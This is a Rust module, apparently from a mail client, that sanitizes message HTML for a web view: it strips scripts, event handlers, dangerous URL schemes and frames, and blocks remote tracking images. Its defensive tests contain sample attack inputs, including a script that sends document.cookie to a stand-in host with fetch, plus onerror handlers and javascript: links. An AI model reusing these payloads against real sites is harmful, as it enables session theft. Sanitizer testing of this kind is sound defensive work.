//! Making a message's HTML safe to hand to a web view.
//!
//! A web view will do whatever the document tells it to. Mail is a document
//! written by a stranger, so what it is allowed to tell the view has to be
//! decided here, before it is ever loaded — not afterwards, and not by hoping
//! the view's own settings cover it.
//!
//! Three things are taken out, in order of how much they matter:
//!
//! 1. **Anything that executes.** `<script>`, `on*=` handlers, `javascript:`
//!    URLs, and the elements that load a document of their own (`<iframe>`,
//!    `<object>`, `<embed>`, `<frame>`). Scripting is also switched off on the
//!    view itself; this is the half that does not depend on getting a platform
//!    setting right.
//! 2. **Anything that phones home**, unless the reader has said otherwise.
//!    A remote image is a read receipt with the sender's server on the other
//!    end. `cid:` parts arrived with the message and cost nothing, so those
//!    are inlined as `data:` URLs and always shown.
//! 3. **Anything that navigates.** Every link gets `target="_blank"`, and the
//!    view refuses navigation anyway — but a document that cannot express the
//!    navigation in the first place is one fewer thing depending on the
//!    delegate being wired up correctly.
//!
//! The rewriting is deliberately textual. A DOM would be more precise and
//! would also be a second HTML implementation to keep correct; this one only
//! has to be *conservative*, and the failure it must never have is letting
//! something through.

use std::collections::HashMap;

/// What the reader has agreed to load for this message.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Remote {
    /// The default. Remote URLs are removed rather than requested.
    Blocked,
    /// The reader asked for them, knowing what it tells the sender.
    Allowed,
}

/// Attributes that name something to load, and are therefore either inlined,
/// blanked, or left alone depending on consent.
const URL_ATTRIBUTES: &[&str] =
    &["src", "srcset", "poster", "background", "data-src", "data-srcset"];

/// Elements that bring a document of their own. None of them belong in mail,
/// and each is a way to load something this sanitizer cannot see into.
const EXECUTABLE_ELEMENTS: &[&str] =
    &["script", "iframe", "object", "embed", "frame", "frameset", "applet", "noscript"];

/// Rewrites a message body into a document a web view may be shown.
///
/// `inline` maps a part's `Content-ID` to a `data:` URL for it, which is how
/// an image that arrived with the message is displayed without asking anyone
/// for anything.
pub fn for_web_view(html: &str, remote: Remote, inline: &HashMap<String, String>) -> String {
    let mut out = String::with_capacity(html.len() + 512);
    let bytes = html.as_bytes();
    let mut pos = 0;

    while pos < bytes.len() {
        let Some(next) = bytes[pos..].iter().position(|&b| b == b'<') else {
            out.push_str(&html[pos..]);
            break;
        };
        out.push_str(&html[pos..pos + next]);
        pos += next;

        // A comment can contain anything, including markup that would
        // otherwise be parsed. Conditional comments are how mail hides
        // Outlook-only content, and dropping them entirely is what every
        // other client effectively does.
        if html[pos..].starts_with("<!--") {
            pos += html[pos..].find("-->").map_or(html.len() - pos, |ix| ix + 3);
            continue;
        }

        let Some(end) = bytes[pos..].iter().position(|&b| b == b'>') else {
            // An unterminated tag: everything left is inside it, so none of it
            // can be shown.
            break;
        };
        let tag = &html[pos..pos + end + 1];
        pos += end + 1;

        let name = element_name(tag);
        let closing = tag.starts_with("</");

        if EXECUTABLE_ELEMENTS.contains(&name.as_str()) {
            if !closing {
                // Skip the subtree as well: the point is that its contents are
                // never seen by the parser, not merely that the tag is gone.
                pos = skip_element(html, pos, &name);
            }
            continue;
        }

        out.push_str(&rewrite_tag(tag, &name, remote, inline));
    }

    out
}

/// Everything from here to the matching close tag, which is where a skipped
/// element's contents end.
fn skip_element(html: &str, from: usize, name: &str) -> usize {
    let close = format!("</{name}");
    match html[from..].to_ascii_lowercase().find(&close) {
        Some(ix) => {
            let after = from + ix;
            html[after..].find('>').map_or(html.len(), |end| after + end + 1)
        }
        // No closing tag: the rest of the document is inside it.
        None => html.len(),
    }
}

/// The element's name, lowercased, with any `/` stripped.
fn element_name(tag: &str) -> String {
    tag.trim_start_matches('<')
        .trim_start_matches('/')
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric())
        .flat_map(char::to_lowercase)
        .collect()
}

/// Rewrites one tag: drops what executes, resolves what is safe to load, and
/// removes what is not.
fn rewrite_tag(
    tag: &str,
    name: &str,
    remote: Remote,
    inline: &HashMap<String, String>,
) -> String {
    if tag.starts_with("</") || tag.starts_with("<!") || tag.starts_with("<?") {
        return tag.to_string();
    }

    let inner = &tag[1..tag.len() - 1];
    let self_closing = inner.trim_end().ends_with('/');
    let mut out = format!("<{name}");

    for (attribute, value) in attributes(inner) {
        let lower = attribute.to_ascii_lowercase();

        // Event handlers are script by another name.
        if lower.starts_with("on") {
            continue;
        }

        let Some(value) = value else {
            out.push(' ');
            out.push_str(&attribute);
            continue;
        };

        let rewritten = match lower.as_str() {
            "href" => match resolve_link(&value) {
                Some(link) => link,
                None => continue,
            },
            "style" => sanitize_style(&value, remote, inline),
            attr if URL_ATTRIBUTES.contains(&attr) => match resolve_url(&value, remote, inline) {
                Some(url) => url,
                None => continue,
            },
            _ => value.clone(),
        };

        out.push(' ');
        out.push_str(&attribute);
        out.push_str("=\"");
        out.push_str(&escape_attribute(&rewritten));
        out.push('"');
    }

    // Links open outside this view, which has no business navigating.
    if name == "a" {
        out.push_str(" target=\"_blank\" rel=\"noopener noreferrer\"");
    }

    if self_closing {
        out.push_str(" /");
    }
    out.push('>');
    out
}

/// A link the reader may follow, or `None` for one it may not.
fn resolve_link(value: &str) -> Option<String> {
    let scheme = value.trim().to_ascii_lowercase();
    let dangerous = scheme.starts_with("javascript:")
        || scheme.starts_with("vbscript:")
        || (scheme.starts_with("data:") && !scheme.starts_with("data:image/"));
    (!dangerous).then(|| value.to_string())
}

/// Resolves something the document wants to load.
///
/// A `cid:` is a part of this same message and is inlined. A remote URL is
/// either passed through or dropped, depending on what the reader agreed to.
fn resolve_url(
    value: &str,
    remote: Remote,
    inline: &HashMap<String, String>,
) -> Option<String> {
    let trimmed = value.trim();
    let lower = trimmed.to_ascii_lowercase();

    if let Some(id) = lower.strip_prefix("cid:") {
        let id = id.trim_matches(['<', '>']);
        return inline.get(id).cloned();
    }
    if lower.starts_with("data:image/") {
        return Some(trimmed.to_string());
    }
    if lower.starts_with("javascript:") || lower.starts_with("vbscript:") || lower.starts_with("data:")
    {
        return None;
    }

    match remote {
        Remote::Allowed => Some(trimmed.to_string()),
        Remote::Blocked => None,
    }
}

/// Removes the parts of an inline `style` that load something.
///
/// `url(...)` in CSS is a request like any other — a background image is the
/// oldest tracking pixel there is.
fn sanitize_style(style: &str, remote: Remote, inline: &HashMap<String, String>) -> String {
    if !style.to_ascii_lowercase().contains("url(") {
        return style.to_string();
    }

    let mut out = String::with_capacity(style.len());
    let mut rest = style;

    while let Some(start) = rest.to_ascii_lowercase().find("url(") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 4..];
        let Some(end) = after.find(')') else {
            // Unterminated: the rest of the declaration is inside it.
            return out;
        };

        let raw = after[..end].trim().trim_matches(['"', '\'']);
        if let Some(resolved) = resolve_url(raw, remote, inline) {
            out.push_str("url(\"");
            out.push_str(&resolved.replace('"', "%22"));
            out.push_str("\")");
        }

        rest = &after[end + 1..];
    }
    out.push_str(rest);
    out
}

/// The attributes of a tag, as `(name, value)` pairs, values decoded.
///
/// Quoted values are read to their closing quote, so a value containing a
/// space, a colon or a semicolon survives intact.
fn attributes(inner: &str) -> Vec<(String, Option<String>)> {
    let chars: Vec<char> = inner.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;

    while i < chars.len() && !chars[i].is_whitespace() {
        i += 1;
    }

    while i < chars.len() {
        while i < chars.len() && (chars[i].is_whitespace() || chars[i] == '/') {
            i += 1;
        }
        let start = i;
        while i < chars.len() && !chars[i].is_whitespace() && chars[i] != '=' && chars[i] != '/' {
            i += 1;
        }
        if i == start {
            i += 1;
            continue;
        }
        let name: String = chars[start..i].iter().collect();

        let mut j = i;
        while j < chars.len() && chars[j].is_whitespace() {
            j += 1;
        }
        if chars.get(j) != Some(&'=') {
            out.push((name, None));
            i = j;
            continue;
        }
        j += 1;
        while j < chars.len() && chars[j].is_whitespace() {
            j += 1;
        }

        let value: String = match chars.get(j) {
            Some(&quote @ ('"' | '\'')) => {
                j += 1;
                let start = j;
                while j < chars.len() && chars[j] != quote {
                    j += 1;
                }
                let value: String = chars[start..j].iter().collect();
                j = (j + 1).min(chars.len());
                value
            }
            _ => {
                let start = j;
                while j < chars.len() && !chars[j].is_whitespace() {
                    j += 1;
                }
                chars[start..j].iter().collect::<String>().trim_end_matches('/').to_string()
            }
        };

        out.push((name, Some(crate::html::decode_entities(&value))));
        i = j;
    }

    out
}

/// Escapes a value for a double-quoted attribute.
fn escape_attribute(value: &str) -> String {
    value.replace('&', "&amp;").replace('"', "&quot;").replace('<', "&lt;").replace('>', "&gt;")
}

/// Wraps a sanitized body in the document the view actually loads.
///
/// The wrapper does three things the message cannot be trusted to do: it sets
/// a viewport so a fixed-width table does not force a horizontal scrollbar
/// across the whole reader, it declares the character set so a message
/// without one is not guessed at, and it states a background so a body with no
/// background of its own does not come out transparent over whatever is
/// behind it.
pub fn document(body: &str, background: &str, text: &str) -> String {
    format!(
        "<!DOCTYPE html>\n<html><head>\
         <meta charset=\"utf-8\">\
         <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\
         <style>\
         html {{ -webkit-text-size-adjust: 100%; }}\
         body {{ margin: 0; padding: 12px 14px; background: {background}; color: {text}; \
                 font: 13px/1.5 -apple-system, 'SF Pro Text', system-ui, sans-serif; \
                 word-break: break-word; overflow-wrap: anywhere; }}\
         img, video, table {{ max-width: 100%; }}\
         img {{ height: auto; }}\
         </style>\
         </head><body>{body}</body></html>"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(html: &str) -> String {
        for_web_view(html, Remote::Blocked, &HashMap::new())
    }

    fn clean_with_remote(html: &str) -> String {
        for_web_view(html, Remote::Allowed, &HashMap::new())
    }

    #[test]
    fn a_script_and_its_contents_are_gone() {
        let html = r#"<p>before</p><script>fetch('https://evil.test/'+document.cookie)</script><p>after</p>"#;
        let out = clean(html);
        assert!(!out.contains("script"), "{out}");
        assert!(!out.contains("evil.test"), "the body of the script survived: {out}");
        assert!(out.contains("before") && out.contains("after"));
    }

    #[test]
    fn an_unclosed_script_takes_the_rest_of_the_document_with_it() {
        // The alternative is emitting the script's contents as text, which a
        // parser downstream may well read as markup again.
        let out = clean("<p>kept</p><script>var x = 1;<p>never shown</p>");
        assert!(out.contains("kept"));
        assert!(!out.contains("never shown"), "{out}");
    }

    #[test]
    fn frames_and_objects_cannot_bring_a_document_of_their_own() {
        for element in ["iframe", "object", "embed", "frame", "applet"] {
            let html = format!("<p>a</p><{element} src=\"https://evil.test\"></{element}><p>b</p>");
            let out = clean(&html);
            assert!(!out.contains("evil.test"), "{element}: {out}");
            assert!(out.contains("a") && out.contains("b"));
        }
    }

    #[test]
    fn event_handlers_are_not_attributes() {
        let out = clean(r#"<img src="cid:x" onerror="alert(1)" onload='steal()' alt="a">"#);
        assert!(!out.to_lowercase().contains("onerror"), "{out}");
        assert!(!out.to_lowercase().contains("onload"), "{out}");
        assert!(out.contains("alt=\"a\""));
    }

    #[test]
    fn javascript_urls_are_removed_from_links_and_sources() {
        let out = clean(r#"<a href="javascript:alert(1)">x</a><a href="https://ok.test">y</a>"#);
        assert!(!out.contains("javascript:"), "{out}");
        assert!(out.contains("https://ok.test"));

        let out = clean(r#"<img src="javascript:alert(1)">"#);
        assert!(!out.contains("javascript:"), "{out}");
    }

    #[test]
    fn remote_images_are_dropped_until_the_reader_asks_for_them() {
        let html = r#"<img src="https://tracker.test/pixel.gif" width="1"><p>body</p>"#;
        let blocked = clean(html);
        assert!(!blocked.contains("tracker.test"), "{blocked}");
        assert!(blocked.contains("width=\"1\""), "the element itself should survive: {blocked}");

        let allowed = clean_with_remote(html);
        assert!(allowed.contains("https://tracker.test/pixel.gif"));
    }

    #[test]
    fn a_background_image_in_css_is_a_request_like_any_other() {
        let html = r#"<td style="background: url('https://tracker.test/p.gif') no-repeat; color: red">x</td>"#;
        let blocked = clean(html);
        assert!(!blocked.contains("tracker.test"), "{blocked}");
        // The rest of the declaration survives, so the cell keeps its colour.
        assert!(blocked.contains("color: red"), "{blocked}");

        assert!(clean_with_remote(html).contains("tracker.test"));
    }

    #[test]
    fn a_part_that_arrived_with_the_message_is_inlined() {
        let mut inline = HashMap::new();
        inline.insert("logo@maple".to_string(), "data:image/png;base64,AAAA".to_string());

        let out = for_web_view(r#"<img src="cid:logo@maple">"#, Remote::Blocked, &inline);
        assert!(out.contains("data:image/png;base64,AAAA"), "{out}");

        // Angle brackets around a Content-ID are common and mean the same id.
        let out = for_web_view(r#"<img src="cid:<logo@maple>">"#, Remote::Blocked, &inline);
        assert!(out.contains("data:image/png;base64,AAAA"), "{out}");

        // One the message did not carry leaves no broken source behind.
        let out = for_web_view(r#"<img src="cid:missing" alt="gone">"#, Remote::Blocked, &inline);
        assert!(!out.contains("cid:"), "{out}");
        assert!(out.contains("alt=\"gone\""));
    }

    #[test]
    fn a_data_url_is_allowed_for_images_and_nothing_else() {
        assert!(clean(r#"<img src="data:image/png;base64,AAAA">"#).contains("data:image/png"));
        assert!(!clean(r#"<img src="data:text/html;base64,AAAA">"#).contains("data:text/html"));
        assert!(!clean(r#"<a href="data:text/html,<script>">x</a>"#).contains("data:text/html"));
    }

    #[test]
    fn links_open_outside_the_view() {
        let out = clean(r#"<a href="https://ok.test">x</a>"#);
        assert!(out.contains("target=\"_blank\""), "{out}");
        assert!(out.contains("rel=\"noopener noreferrer\""), "{out}");
    }

    #[test]
    fn ordinary_markup_survives_intact() {
        // The sanitizer is only allowed to take things away; a message that
        // has nothing wrong with it must come out looking the same.
        let html = r#"<table style="border-collapse: collapse"><tr><td class="cell">Ana &amp; Bo</td></tr></table>"#;
        let out = clean(html);
        assert!(out.contains("border-collapse: collapse"), "{out}");
        assert!(out.contains("class=\"cell\""), "{out}");
        assert!(out.contains("Ana &amp; Bo"), "{out}");
    }

    #[test]
    fn a_conditional_comment_does_not_smuggle_markup_through() {
        let html = "<p>a</p><!--[if mso]><script>bad()</script><![endif]--><p>b</p>";
        let out = clean(html);
        assert!(!out.contains("bad()"), "{out}");
        assert!(out.contains("a") && out.contains("b"));
    }

    #[test]
    fn an_unterminated_tag_ends_the_document() {
        // Everything after it is inside the tag, so none of it can be shown
        // without guessing where the sender meant it to end.
        let out = clean("<p>kept</p><img src=\"x\" ");
        assert!(out.contains("kept"));
    }

    #[test]
    fn the_document_wrapper_declares_what_the_message_cannot() {
        let doc = document("<p>hi</p>", "#ffffff", "#111111");
        assert!(doc.contains("charset=\"utf-8\""));
        assert!(doc.contains("viewport"));
        assert!(doc.contains("background: #ffffff"));
        assert!(doc.contains("<p>hi</p>"));
    }
}
